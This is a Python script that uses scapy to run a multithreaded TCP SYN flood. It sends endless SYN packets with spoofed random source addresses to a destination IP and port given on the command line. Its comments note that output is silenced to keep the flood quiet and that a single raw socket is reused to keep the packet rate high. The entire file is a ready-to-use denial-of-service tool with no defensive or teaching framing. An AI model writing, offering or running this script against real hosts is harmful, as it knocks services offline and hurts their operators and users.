from scapy.all import *
from threading import Thread
from sys import argv

THREADS = 8

def syn_flood(dst_ip, dst_port):
    # silence scapy's per-packet status output so the flood is quiet
    conf.verb = 0

    # opens one reusable raw layer-3 socket to avoid send()'s creation of a new socket for every packet
    # SYN rate stays high
    sock = conf.L3socket()
    while True:
        pkt = IP(src=str(RandIP()), dst=dst_ip) / \
            TCP(sport=int(RandShort()), dport=dst_port, flags="S", seq=int(RandInt()))
        sock.send(pkt)

if __name__ == "__main__":
    if len(argv) != 3:
        print(f"Usage: python3 {argv[0]} <destination_ip> <destination_port>")
        exit(1)

    dst_ip, dst_port = argv[1], int(argv[2])
    workers = [Thread(target=syn_flood, args=(dst_ip, dst_port), daemon=True) for _ in range(THREADS)]

    for worker in workers:
        worker.start()
    for worker in workers:
        worker.join()